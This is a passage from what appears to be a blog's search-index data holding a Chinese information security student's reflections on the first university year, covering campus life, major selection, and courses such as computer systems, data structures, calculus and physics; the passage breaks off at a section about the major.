<ul> <li> \u5927\u4e00\u5c0f\u8bb0  4575  15 mins              1739718485 </li> </ul>"},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/","title":"\u5927\u4e00\u5c0f\u8bb0","text":"","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#_1","title":"\u5927\u4e00\u5c0f\u8bb0","text":"","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#i","title":"I \u5199\u5728\u524d\u9762","text":"<p>\u6587\u7ae0\u662f\u5927\u4e00\u5b66\u751f\u5bf9\u5927\u5b66\u7b2c\u4e00\u5e74\u7684\u603b\u7ed3\uff0c\u91cd\u70b9\u5728\u5b66\u4e60\u548c\u751f\u6d3b\u4f53\u9a8c\uff0c\u5c24\u5176\u662f\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u3002</p> <ul> <li>\u5927\u4e00\u79cb\u51ac\u5b66\u671f\uff1a \u521d\u5230\u5927\u5b66\uff0c\u9010\u6e10\u9002\u5e94\u5b66\u4e60\u8282\u594f\uff0c\u5f3a\u8c03\u627e\u5230\u9002\u5408\u81ea\u5df1\u7684\u5b66\u4e60\u65b9\u6cd5\uff0c\u5206\u4eab\u5de5\u4fe1\u4e13\u4e1a\u5206\u6d41\u8d44\u6599\u3002</li> <li>\u5927\u4e00\u6625\u590f\u5b66\u671f\uff1a \u7ed3\u8bc6\u66f4\u591a\u4e13\u4e1a\u540c\u5b66\uff0c\u83b7\u5f97\u5b66\u957f\u5b66\u59d0\u7ecf\u9a8c\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u201c\u8ba1\u7b97\u673a\u7cfb\u7edf I\u201d\u3001\u201c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u201d\u548c\u201c\u5fae\u79ef\u5206\u7532\uff08II\uff09\u201d\u7684\u5b66\u4e60\u4f53\u9a8c\uff0c\u611f\u53d7\u5230\u5b66\u4e60\u538b\u529b\u3002</li> <li>\u5173\u4e8e\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\uff1a \u9009\u62e9\u4fe1\u5b89\u7684\u539f\u56e0\u5305\u62ec\u7ade\u4e89\u538b\u529b\u3001\u7ecf\u9a8c\u5206\u4eab\u548c\u4e2a\u4eba\u5174\u8da3\uff0c\u8ba4\u4e3a\u8bfe\u7a0b\u5185\u5bb9\u624e\u5b9e\u4f46\u9700\u4ed8\u51fa\u52aa\u529b\u3002</li> <li>\u603b\u4f53\u800c\u8a00\uff1a \u6587\u7ae0\u771f\u5b9e\u53cd\u6620\u5927\u4e00\u5b66\u751f\u7684\u4f53\u9a8c\u548c\u601d\u8003\uff0c\u5bf9\u60f3\u4e86\u89e3\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u6216\u5373\u5c06\u5165\u5b66\u7684\u5b66\u751f\u6709\u53c2\u8003\u4ef7\u503c\uff0c\u5efa\u8bae\u6839\u636e\u5174\u8da3\u548c\u80fd\u529b\u9009\u62e9\u4e13\u4e1a\uff0c\u51c6\u5907\u8fce\u63a5\u6311\u6218\u3002</li> </ul> <p>\u4eca\u5929\u4e0a\u5348\u7ed3\u675f\u4e86\u5927\u5b66\u4e00\u5e74\u7ea7\u6700\u540e\u4e00\u95e8\u8bfe\u7a0b\u7684\u8003\u8bd5\uff0c\u4e0d\u77e5\u4e0d\u89c9\u5927\u4e00\u5c31\u8981\u7ed3\u675f\u4e86\u3002\u867d\u7136\u6210\u7ee9\u5e73\u5e73\uff0c\u4f46\u8fd8\u662f\u60f3\u5199\u4e00\u4e2a\u5c0f\u603b\u7ed3\u5427\u3002</p> <p>\u672c\u6765\u662f 6.28 \u8003\u5b8c\u4e86\u5c31\u6253\u7b97\u5199\u7684\uff0c\u7ed3\u679c\u8fd8\u662f\u62d6\u5230\u4e86\u73b0\u5728\u2026\u2026</p> <p>\u4e00\u4e2a 23 \u7ea7\u4fe1\u5b89\u672c\u79d1\u751f\u7684\u56de\u987e\u5c0f\u7ed3\uff0c\u8bfe\u7a0b\u5206\u4eab\u4e0d\u591a\uff0c\u66f4\u50cf\u662f\u6211\u7684\u5927\u4e00\u201c\u5b66\u4e60\u751f\u6d3b\u201d\u6982\u8ff0\u5427\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii","title":"II \u5173\u4e8e\u5927\u4e00","text":"","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii1","title":"II.1 \u5927\u4e00\u79cb\u51ac","text":"","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii11","title":"II.1.1 \u6e38\u89c8\u6821\u56ed","text":"<p>\u521d\u5230\u5927\u5b66\uff0c\u5bf9\u6211\u8fd9\u4e2a\u6765\u81ea\u5c0f\u53bf\u57ce\u7684\u4eba\u6765\u8bf4\u6ee1\u773c\u90fd\u662f\u65b0\u5947\u3002</p> <p>\u5728\u79cb\u5b66\u671f\uff0c\u6211\u5dee\u4e0d\u591a\u628a\u7d2b\u91d1\u6e2f\u6821\u533a\u4e1c\u533a\u8d70\u4e86\u4e2a\u904d\uff0c\u54ea\u91cc\u6709\u98df\u5802 \uff08\u6700\u7ec8\u4e2a\u4eba\u7ed3\u8bba\u662f\u4e1c\u6559\u9ea6\u65af\u5a01\u559c\u6dfb\u6700\u53f2\uff09 \uff0c\u6559\u5b66\u697c\u7684\u7ed3\u6784\uff0c\u5efa\u7b51\u7684\u5e03\u5c40\u7b49\u7b49\u3002\u5bf9\u6211\u6765\u8bf4\uff0c\u867d\u7136\u52bf\u5fc5\u4f1a\u5728\u4ee5\u540e\u7684\u5b66\u4e60\u751f\u6d3b\u4e2d\u9010\u6e10\u719f\u6089\u8fd9\u4e9b\uff0c\u4f46\u6211\u662f\u4e00\u4e2a\u4e0d\u559c\u53d8\u5316\u7684\u4eba\uff0c\u5e0c\u671b\u65e9\u65e9\u628a\u5168\u5c40\u5b89\u6392\u597d\uff08\u5178\u578b\u7684 J \u4eba\u5427\uff09\ud83e\uddd0\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii12","title":"II.1.2 \u5b66\u4e60\u8bfe\u7a0b","text":"<p>\u6211\u76f8\u4fe1\u5f88\u591a\u4eba\u4f1a\u548c\u6211\u8d77\u521d\u4e00\u6837\uff0c\u8ba4\u4e3a\u5927\u5b66\u8bfe\u5802\u548c\u9ad8\u4e2d\u8bfe\u5802\u7684\u552f\u4e00\u5dee\u522b\u53ea\u662f\u201c\u6559\u5ba4\u4e0d\u56fa\u5b9a\uff0c\u6559\u5e08\u4e0d\u56fa\u5b9a\uff0c\u5ea7\u4f4d\u4e0d\u56fa\u5b9a\uff0c\u8bfe\u7a0b\u6bcf\u5b66\u671f\u53d8\u201d\u3002\u6240\u4ee5\uff0c\u5728\u7b2c\u4e00\u4e8c\u5468\u7684\u65f6\u5019\u7684\u5230\u8bfe\u7387\u662f\u6781\u5176\u9ad8\u7684\uff1b\u6700\u5f00\u59cb\u7684\u4f5c\u4e1a\u63d0\u4ea4\u901f\u5ea6\u3001\u8d28\u91cf\u4e5f\u662f\u5f88\u9ad8\u7684\u3002\u6162\u6162\u5730\uff0c\u5927\u5bb6\u53d1\u73b0\uff0c\u4e0d\u5230\u8bfe\u4f3c\u4e4e\u4e0d\u662f\u4e0d\u53ef\u4ee5\u7684 \u6709\u65f6\u5019\u786e\u5b9e\u96be\u4ee5\u8d76\u6765\u4e0a\u8bfe\u2026\u2026\u6e10\u6e10\u7684\uff0c\u4e0a\u8bfe\u4eba\u5c31\u5c11\u4e86\ud83e\udd2b\u3002</p> <p>\u4f46\u662f\u66f4\u591a\u65f6\u5019\uff0c\u76f2\u76ee\u8ddf\u98ce\u5f88\u96be\u5b66\u5230\u4e1c\u897f\u3002\u57fa\u4e8e\u4e0d\u540c\u5927\u5b66\u4e0d\u540c\u8001\u5e08\u7684\u8bb2\u89e3\u8d28\u91cf\u3001\u5b66\u751f\u672c\u4eba\u7684\u52e4\u61d2\u7a0b\u5ea6\uff08\u4e0d\u8981\u73b0\u5728\u4e0b\u5b9a\u7ed3\u8bba\u81ea\u5df1\u80fd\u591f\u575a\u6301\u4e0b\u6765\uff09\u3001\u4ee5\u53ca\u81ea\u5df1\u5728\u9ad8\u4e2d\u65f6\u7684\u57fa\u7840\uff0c\u6211\u4eec\u5e94\u8be5\u627e\u5230\u66f4\u52a0\u9002\u5408\u81ea\u5df1\u7684\u65b9\u6cd5\u3002\u5728\u6211\u770b\u6765\uff0c\u8001\u5e08\u4e3a\u4e86\u4e0d\u8ba9\u5b66\u751f\u8fc7\u5ea6\u6446\u70c2\u5e94\u5f53\u91c7\u53d6\u4e00\u4e9b\u63aa\u65bd\uff0c\u4f46\u662f\u8fd9\u4e9b\u63aa\u65bd\u5e94\u5f53\u4e3b\u8981\u4ee5\u7ed3\u679c\u6765\u8bc4\u5b9a\u3002\u5927\u5b66\u5e94\u8be5\u662f\u4e00\u4e2a\u81ea\u7531\u5ea6\u8f83\u9ad8\u7684\u573a\u5408\uff0c\u7fd8\u8bfe\u4e0d\u7b49\u4e8e\u4e0d\u5b66\uff0c\u6211\u4eec\u5e94\u8be5\u53bb\u5c1d\u8bd5\u4e0d\u540c\u7684\u89e3\u51b3\u529e\u6cd5\u3001\u53bb\u4ee5\u8f83\u4f4e\u7684\u6210\u672c\u53bb\u8bd5\u9519\u3001\u53bb\u8fdb\u6b65\u3002</p> <p>\u5f88\u53ef\u60dc\u7684\u662f\uff0c\u57fa\u4e8e\u5927\u5b66\u7684\u201c\u751f\u7269\u591a\u6837\u6027\u201d\uff0c\u5373\u4fbf\u662f\u6bd4\u8f83\u5f00\u660e\u7684\u8001\u5e08\uff0c\u4e5f\u5e76\u6ca1\u6709\u529e\u6cd5\u533a\u5206\u5927\u5bb6\u5982\u679c\u6ca1\u6709\u542c\u4ece ta \u7684\u5b89\u6392\u7684\u8bdd\uff0c\u662f\u5728\u6309\u7167\u81ea\u5df1\u7684\u60f3\u6cd5\u884c\u52a8\uff0c\u8fd8\u662f\u8eba\u5728\u5bdd\u5ba4\u6253\u6e38\u620f/\u7761\u89c9\u3002\u6240\u4ee5\uff0c\u70e6\u4eba\u7684\u8003\u52e4\u3001\u8003\u6838\u673a\u5236\u7b49\u51fa\u73b0\u4e86\uff0c\u5e76\u5360\u636e\u4e86\u6211\u4eec\u76f8\u5f53\u4e00\u90e8\u5206\u65f6\u95f4\u3002\u800c\u5982\u4f55\u53bb\u8861\u91cf\u4e0a\u8bfe/\u81ea\u5b66/\u6446\u70c2\uff0c\u6210\u4e86\u4e00\u95e8\u5b66\u95ee\u3002\u8fd9\u95e8\u5b66\u95ee\u4e0d\u597d\u6559\uff0c\u4e5f\u4e0d\u4f1a\u6559\u3001\u4e0d\u80fd\u6559\ud83d\udca6\u3002</p> <p>\u5927\u4e00\u79cb\u51ac\u7684\u8bfe\u7a0b\u5b89\u6392\u4e0a\u90fd\u662f\u57fa\u7840\u8bfe\u7a0b\uff08\u4f8b\u5982\u6211\u5b66\u7684\u662f\u5fae\u79ef\u5206/\u7ebf\u6027\u4ee3\u6570/C \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1/\u5927\u5b66\u82f1\u8bed III\uff09\uff0c\u5b66\u4e60\u65b9\u5f0f\u8fd8\u662f\u6bd4\u8f83\u8d34\u8fd1\u4e8e\u9ad8\u4e2d\u4e0a\u8bfe\u7684\uff0c\u6240\u4ee5\u4e5f\u6ca1\u5565\u597d\u8bb2\u7684\uff0c\u521a\u521a\u9ad8\u8003\u5b8c\u7684\u52c7\u58eb\u6bd4\u6211\u66f4\u52a0\u719f\u6089\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii13","title":"II.1.3 \u53d1\u6398\u81ea\u8eab","text":"<p>\u5728\u5927\u4e00\u79cb\u51ac\u7684\u8bfe\u7a0b\u4e2d\uff0c\u6211\u4eec\u5b66\u7684\u66f4\u591a\u662f\u57fa\u7840\u5185\u5bb9\uff0c\u8fd9\u4e5f\u662f\u56e0\u4e3a\u73b0\u5728\u5927\u5bb6\u9009\u7684\u662f\u5927\u7c7b\uff0c\u5927\u7c7b\u4e2d\u4ea6\u6709\u8bb8\u591a\u65b9\u5411\u53ef\u9009\u3002\u800c\u5728\u5206\u6d41\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u9700\u8981\u66f4\u591a\u7684\u8003\u91cf\u3002</p> <p>\u4ee5\u5de5\u4fe1\u4e3a\u4f8b\uff0c\u6709\u7684\u4eba\u559c\u6b22\u7f16\u7a0b/\u7f51\u7edc\u67b6\u6784\u800c\u9009\u62e9\u4e86\u53bb\u4e89\u62a2 CS\uff1b\u6709\u7684\u4eba\u8ba8\u538c\u7f16\u8bd1\u5668\u773c\u82b1\u7f2d\u4e71\u7684\u62a5\u9519\u4fe1\u606f\uff0c\u4e0d\u559c\u6b22\u548c\u592a\u591a\u4eba\u53bb\u7ade\u4e89/\u4e0d\u559c\u6b22\u9762\u8bd5\uff0c\u5c31\u9009\u62e9\u4e86\u5bf9\u4e8e\u7f16\u7a0b\u8981\u6c42\u66f4\u4f4e\u7684\u5176\u4ed6\u4e13\u4e1a\u3002\u5de5\u4f5c/\u53d1\u5c55\u4e0d\u53ef\u80fd\u662f\u6211\u4eec\u9009\u62e9\u4e13\u4e1a\u65f6\u4e0d\u53bb\u8003\u8651\u7684\uff0c\u4f46\u662f\u8c01\u8bf4\u5c31\u662f\u5168\u90e8\u5462\uff1f</p> <p>\u52aa\u529b\u53d1\u73b0\u81ea\u5df1\u60f3\u5b66\u5565\uff0c\u522b\u50cf\u6211\u4e00\u6837\u5728\u5206\u6d41\u5468\u624b\u5fd9\u811a\u4e71\u5730\u627e\u5404\u8def\u4fe1\u606f\uff0c\u586b\u62a5\u5fd7\u613f\u65f6\u72b9\u8c6b\u4e0d\u51b3\u3002\ud83e\udd72</p> <p>\u8fd9\u91cc\u9644\u5e26\u81ea\u5df1\u5206\u6d41\u65f6\u7684\u6574\u7406\uff0c\u4f46\u662f\u6bd4\u8f83\u4e71\uff0c\u4fe1\u606f\u53ef\u80fd\u4e5f\u6bd4\u8f83\u8001\ud83e\udd10\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii2","title":"II.2 \u5927\u4e00\u6625\u590f","text":"","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii21","title":"II.2.1 \u751f\u6d3b\u4e0a","text":"<p>\u5728\u5927\u4e00\u7684\u6625\u590f\uff0c\u7531\u4e8e\u6211\u7684\u4e13\u4e1a\u2014\u2014\u4fe1\u606f\u5b89\u5168\u7684\u57f9\u517b\u65b9\u6848\u5b89\u6392\uff0c\u6709\u4e86\u66f4\u591a\u7684\u8bfe\u7a0b\u662f\u672c\u4e13\u4e1a\u540c\u5b66\u4e00\u8d77\u4e0a\u7684\u8bfe\uff0c\u6211\u66f4\u52a0\u5bb9\u6613\u63a5\u89e6\u5230\u672c\u4e13\u4e1a\u7684\u540c\u5b66\u4e86\uff1b\u5927\u6982\u662f\u4e13\u4e1a\u4eba\u6570\u8f83\u5c11\uff0c\u6211\u4eec\u6bd4\u8f83\u5feb\u7684\u5c31\u719f\u7edc\u4e86\u8d77\u6765\uff0c\u4e13\u4e1a\u7fa4\u4e5f\u6e10\u6e10\u70ed\u95f9\u8d77\u6765\u3002</p> <p>\u57fa\u4e8e\u6b64\uff0c\u6211\u5728\u5927\u4e00\u6625\u590f\u7ed3\u8bc6\u7684\u670b\u53cb\u8303\u56f4\u66f4\u5c0f\u4e86\uff0c\u4f46\u662f\u4ea4\u6d41\u66f4\u591a\u4e86\u3002\u6211\u4eec\u5206\u4eab\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u4e00\u540c\u6269\u5c55\u89c6\u91ce\uff1b\u6211\u4eec\u4e0e\u5f7c\u6b64\u4ea4\u6d41\u81ea\u5df1\u7684\u60f3\u6cd5\uff0c\u5171\u540c\u89e3\u51b3 \u4f5c\u4e1a \u95ee\u9898\uff08\u8bb2\u771f\uff0c\u90fd\u80fd\u5b8c\u5168\u72ec\u7acb\u5b8c\u6210\u771f\u662f\u5927\u4f6c\uff09\uff1b\u6211\u4eec\u5076\u5c14\u5730\u7ea6\u996d\uff0c\u5c31\u5355\u7eaf\u5750\u5728\u4e00\u8d77\u8bf4\u8bdd\u804a\u5929\u2026\u2026\u5f53\u7136\uff0c\u4e00\u5207\u90fd\u57fa\u4e8e\u4f60\u613f\u804a\u6562\u804a\uff1b\u4fe1\u5b89\u4e0d\u80fd\u591f\u5e2e I \u4eba\u53d8\u4e3a E \u4eba\u3002</p> <p>\u540c\u65f6\uff0c\u5728\u5927\u4e00\u4e0b\u6211\u4e5f\u66f4\u52a0\u7ed3\u8bc6\u4e86\u5f88\u591a\u4fe1\u5b89\u76f4\u7cfb\u5b66\u957f\u5b66\u59d0\uff0c\u53d1\u73b0\u4e86 IS \u8de8\u5e74\u7ea7\u7fa4\uff1b\u867d\u8bf4\u7fa4\u6d3b\u8dc3\u4eba\u6570\u5360\u6bd4\u4e0d\u5927\uff0c\u4f46\u5e9e\u5927\u7684\u57fa\u6570\u4e0b\u7fa4\u4e2d\u4f9d\u65e7\u6bd4\u8f83\u70ed\u95f9\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u7fa4\u4e2d\u201c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u9009\u8bfe\u3001\u8003\u8bd5\u3001\u672a\u6765\u89c4\u5212\u3001\u6d3b\u52a8\u3001\u5b9e\u9a8c\u201d\uff0c\u6bd4\u8f83\u76f4\u89c2\u5730\u5f53\u7136\u662f\u8be2\u95ee\u4e00\u4e9b\u9009\u8bfe\u60c5\u51b5\uff08\u54ea\u4e2a\u8bfe/\u8001\u5e08\u600e\u4e48\u600e\u4e48\u6837\u7b49\u7b49\uff09\uff0c\u5bf9\u5c06\u8981\u4e0a\u7684\u8bfe\u6709\u4e00\u4e2a\u57fa\u672c\u7684\u4e86\u89e3\u3002\u5f53\u7136\uff0c\u7fa4\u5185\u4e5f\u4f1a\u5076\u5c14\u5520\u5520\u55d1\uff0c\u4f8b\u5982\u6bd4\u8f83\u7ecf\u5178\u7684\u4e00\u4e2a\u573a\u9762\u662f\u4ece 18 \u7ea7\u5230 23 \u7ea7\uff0c\u4e00\u7fa4\u4eba\u53d1\u9001\u201c\u8c01\u80fd\u5377\u8fc7\u4f60\u4eec\u4fe1\u5b89\u7684\u5440\u201d\ud83e\udd23\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii22","title":"II.2.2 \u5b66\u4e60\u4e0a","text":"<p>\u5bf9\u4e8e\u51e0\u95e8\u201c\u4e13\u4e1a\u57fa\u7840\u8bfe\u201d\uff0c\u8bb8\u591a 98 \u7ecf\u9a8c\u8d34\u5199\u7684\u6bd4\u8f83\u6e05\u695a\u76f4\u63a5\u4e86\u3002</p> <p>note_link \u662f\u6211\u6536\u96c6\u7684\u4e00\u4e9b\u7b14\u8bb0\u94fe\u63a5\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii221-i","title":"II.2.2.1 \u8ba1\u7b97\u673a\u7cfb\u7edf I","text":"<p>\u4f5c\u4e3a\u8bfe\u6539\u91cd\u70b9\u4e4b\u4e00\uff0c\u8ba1\u7b97\u673a\u7cfb\u7edf\u76f8\u6bd4\u5f80\u5c4a\u4e00\u76f4\u5728\u4fee\u6539\uff0c\u5c24\u5176\u662f\u5b9e\u9a8c\u4e0a\u3002\u5e73\u65f6\u4f5c\u4e1a\u8f83\u5c11\uff0c\u4e3b\u8981\u82b1\u65f6\u95f4\u5728\u5b9e\u9a8c\u4e0a\u3002</p> <p>\u5b9e\u9a8c\u91c7\u7528\u4e3b\u8981\u91c7\u7528 verilog \u8fd9\u4e00\u786c\u4ef6\u63cf\u8ff0\u8bed\u8a00\uff0c\u8fd1\u5e74\u90fd\u6709\u52a9\u6559\u4eec\u5199\u7684\u5b9e\u9a8c\u6846\u67b6\u4ee3\u7801\u548c\u5b9e\u9a8c\u6307\u5bfc\uff1b\u6211\u4eec\u6240\u505a\u7684\u66f4\u591a\u662f\u8865\u5168\u4e00\u4e9b\u5173\u952e\u7684\u6a21\u5757\uff1b\u8fd9\u6837\u770b\u6765 \uff0c\u5199\u4e00\u4e2a\u5355\u5468\u671f CPU \u8fd8\u4e0d\u662f\u7b80\u7b80\u5355\u5355 \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u66f4\u591a\u5730\u7cbe\u529b\u653e\u5728\u9010\u6b65\u5b66\u4e60\u5173\u952e\u8bed\u6cd5\u548c\u5982\u4f55\u5e94\u7528\u4e0a\u3002</p> <p>\u540c\u65f6\uff0c\u5728\u8fd9\u95e8\u8bfe\u4e0a\uff0c\u6211\u4e5f\u5b66\u4f1a\u4e86\u66f4\u597d\u5730\u53bb\u4f7f\u7528 git \u8fd9\u4e00\u5de5\u5177\uff0c\u8ba4\u8bc6\u5230 makefile \u7684\u5999\u7528\uff0c\u4ee5\u53ca\u5982\u4f55\u5728\u4e00\u5927\u5806\u629b\u51fa\u9519\u8bef\u4e2d\u627e\u5230\u95ee\u9898\u6240\u5728\uff08\u771f\u7684\u5417\uff1f\uff09\u3002</p> <p>\u4e5f\u6b63\u56e0\u91cd\u70b9\u5728\u5b9e\u9a8c\uff0c\u7406\u8bba\u8bfe\u7a0b\u8fdb\u5ea6\u53c8\u6162\u4e8e\u5b9e\u9a8c\u7684 ddl\uff0c\u6240\u4ee5\u4e00\u90e8\u5206\u4eba\u5f00\u59cb\u5ffd\u7565\u7406\u8bba\u8bfe\u7684\u5b66\u4e60\uff08\u5305\u62ec\u6211\uff09\uff0c\u4e5f\u5bfc\u81f4\u4e86\u671f\u672b\u7406\u8bba\u8003\u7684\u4e00\u8138\u61f5\u2026\u2026</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii222-fds","title":"II.2.2.2 FDS\uff08\u6570\u636e\u7ed3\u6784\u57fa\u7840\uff09","text":"<p>\u57fa\u4e8e C \u8bed\u8a00\uff0c\u6211\u7b2c\u4e00\u6b21\u63a5\u89e6\u5230\u7b97\u6cd5\uff0c\u5b66\u4f1a\u5982\u4f55\u4f7f\u7528\u7b80\u5355\u7684\u6570\u636e\u7c7b\u578b\u548c\u8bed\u6cd5\u53bb\u5b9e\u73b0\u66f4\u4e3a\u5f3a\u5927\u7684\u529f\u80fd\u3002</p> <p>\u8fd9\u95e8\u8bfe\u6709\u4e00\u4e2a\u607c\u4eba\u7684\u673a\u5236 PR\uff08peer review\uff0c\u540c\u4f34\u4e92\u8bc4\uff09\uff0c\u8bb0\u5fc6\u4e2d\u4e0a\u8fc7\u51e0\u6b21\u6735\u6735/98 \u5341\u5927\u3002\u7531\u4e8e\u5927\u5bb6\u6c34\u5e73\u5404\u5f02\u3001\u8bc4\u5224\u6807\u51c6\u4e0d\u4e00\uff0c\u4ee5\u53ca\u4e00\u4e9b\u4e0d\u4fbf\u8a00\u660e\u7684\u5fc3\u6001\uff0c\u603b\u4f1a\u6709\u4eba\u88ab\u6293\u4f4f\u4e00\u4e9b\u5c0f\u7ec6\u8282\u6263\u5206\uff1b\u867d\u8bf4\u5f71\u54cd\u751a\u5fae\uff0c\u4f46\u5927\u6982\u89c9\u5f97\u81ea\u5df1\u5e78\u5e78\u82e6\u82e6\u5199\u4e86\u51e0\u5929\u7684\u4ee3\u7801/\u62a5\u544a\u88ab\u968f\u610f\u6263\u5206\uff0c\u591a\u5c11\u6709\u4e9b\u4e0d\u5feb\u3002</p> <p>\u597d\u5728\u8fd9\u95e8\u8bfe\u6709 4\u2032 \u7684 bonus\uff0c\u52a0\u4e0a yzq \u8001\u5e08\u5e73\u65f6\u7684\u5c0f\u6d4b\u4e3b\u8981\u662f\u5728\u70b9\u540d\uff0c\u5e73\u65f6\u5206\u57fa\u672c\u80fd\u591f\u62ff\u6ee1\uff1b\u671f\u672b\u8003\u8bd5\u2026\u2026\u5927\u5bb6\u90fd\u8bf4\u591a\u505a\u9898\u5427\uff0c\u4f46\u662f\u6709\u65f6\u5019\u8fd8\u662f\u505a\u4e0d\u51fa\u6765\uff1b\u6700\u540e\u6709 8 \u5206\u7a0b\u5e8f\u9898\uff0c\u4e2a\u4eba\u7559\u4e86 45 \u5206\u949f\u90fd\u6ca1\u5199\u5b8c\uff0c\u7ed3\u679c\u662f 1 \u5206\u6ca1\u6709\uff08\u4e2a\u4eba\u5199\u4ee3\u7801\u592a\u6162\u4e86\uff09\uff0c\u8003\u5b8c\u5c31\u80fd\u770b\u5230\u6210\u7ee9\u4e86\ud83e\udd72\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii223-ii","title":"II.2.2.3 \u5fae\u79ef\u5206\u7532\uff08II\uff09","text":"<p>\u5927\u4e00\u79cb\u51ac\uff0c\u6807\u51c6\u7684\u9ad8\u4e2d\u751f\u5fc3\u6001\uff0c\u6240\u4ee5\u5fae\u7532\uff08I\uff09\u5b66\u7684\u8fd8\u4e0d\u9519\uff1b\u5230\u6625\u590f\u65f6\uff0c\u4e0a\u9762\u4e24\u95e8\u5927\u8bfe\u5c31\u591f\u5403\u4e00\u58f6\u4e86\uff0c\u6240\u4ee5\u82b1\u7684\u65f6\u95f4\u786e\u5b9e\u5c11\uff0c\u57fa\u672c\u662f\u770b\u7740\u7b54\u6848\u5199\u5b8c\u4f5c\u4e1a\u5c31\u4f5c\u7f62\u4e86\uff0c\u66f4\u591a\u5730\u5403\u9ad8\u4e2d\u548c\u5927\u4e00\u4e0a\u7684\u8001\u672c\u4e86\u3002\u5728 zjf \u8001\u5e08\u73ed\u4e0a\uff0c\u6700\u540e\u603b\u8bc4\u8fd8\u4e0d\u9519\uff0c\u671f\u4e2d\u671f\u672b\u90fd\u633a\u7cdf\u7684\uff0c\u5e94\u8be5\u662f\u635e\u4e86\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii224-i","title":"II.2.2.4 \u5927\u5b66\u7269\u7406\u4e59\uff08I\uff09","text":"<p>\u9ad8\u4e2d\u7269\u7406\u8fd8\u4e0d\u9519\uff0c\u6240\u4ee5\u4e2a\u4eba\u6709\u5403\u8001\u672c\u5acc\u7591\uff0c\u8bfe\u542c\u7684\u4e5f\u6bd4\u8f83\u5c11\uff08\u9003\uff09\u3002</p> <p>\u5728\u738b\u9707/\u5b8b\u8d85\u73ed\uff0c\u4e24\u4f4d\u8001\u5e08\u4e00\u4eba\u6625\u4e00\u4eba\u590f\uff0c\u90fd\u4e0d\u70b9\u540d\uff0c\u5c0f\u6d4b\u63d0\u524d\u901a\u77e5\uff0c\u9898\u76ee\u90fd\u8fd8\u6bd4\u8f83\u7b80\u5355\uff1b\u5728\u671f\u672b\u7684\u65f6\u5019\u542c\u8bfe\u6bd4\u8f83\u591a\uff0c\u5b8b\u8001\u5e08\u8bb2\u8bfe\u633a\u4e0d\u9519\u7684\uff08\u5bf9\u4e0d\u8d77\u738b\u8001\u5e08\ud83e\udd72\uff09\uff0c\u65f6\u95f4\u628a\u63a7\u597d\uff0c\u5185\u5bb9\u6e05\u6670\uff0c\u4e5f\u4e0d\u5728\u610f\u6211\u4eec\u5728\u4e0b\u9762\u5e72\u5565\u3002</p> <p>\u5171 4 \u6b21\u5c0f\u6d4b\uff0c\u603b\u4f53\u6bd4\u8f83\u7b80\u5355\uff1b\u7b2c 2 \u6b21\u5c0f\u6d4b\u6bd4\u8f83\u96be\uff0c\u6263\u4e86\u4e00\u4e9b\u5206\uff0c\u4e4b\u540e\u751a\u81f3\u5728\u7b2c 4 \u6b21\u5c0f\u6d4b\u7ed9\u4e86 bonus\uff0c\u628a\u6263\u7684\u5206\u8865\u56de\u6765\u4e86\ud83d\ude07\u3002</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#ii225","title":"II.2.2.5 \u5176\u4ed6","text":"<p>\u5176\u4ed6\u8bfe\u7a0b\u5c31\u4e0d\u8c08\u4e86\uff0c\u4e3b\u8981\u662f\u601d\u4fee\u8bfe\uff0c\u5927\u5bb6\u5bf9\u8fd9\u7c7b\u8bfe\u8912\u8d2c\u4e0d\u4e00\u3002</p> <p>\u4e2a\u4eba\u611f\u89c9\u6bd4\u8f83\u5927\u7684\u539f\u56e0\u662f\uff1a\u8fd9\u4e9b\u8bfe\u7684\u6295\u5165\u548c\u56de\u62a5\u786e\u5b9e\u76f8\u5173\u7cfb\u6570\u8f83\u5c0f\u2026\u2026</p>","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#iii","title":"III \u5173\u4e8e\u6211\u7684\u4e13\u4e1a\u2014\u2014\u4fe1\u606f\u5b89\u5168\uff08\u5de5\u4fe1\uff09","text":"","tags":["summary"]},{"location":"summary/%E5%A4%A7%E4%B8%80%E5%B0%8F%E8%AE%B0/#iii1","title":"III.1 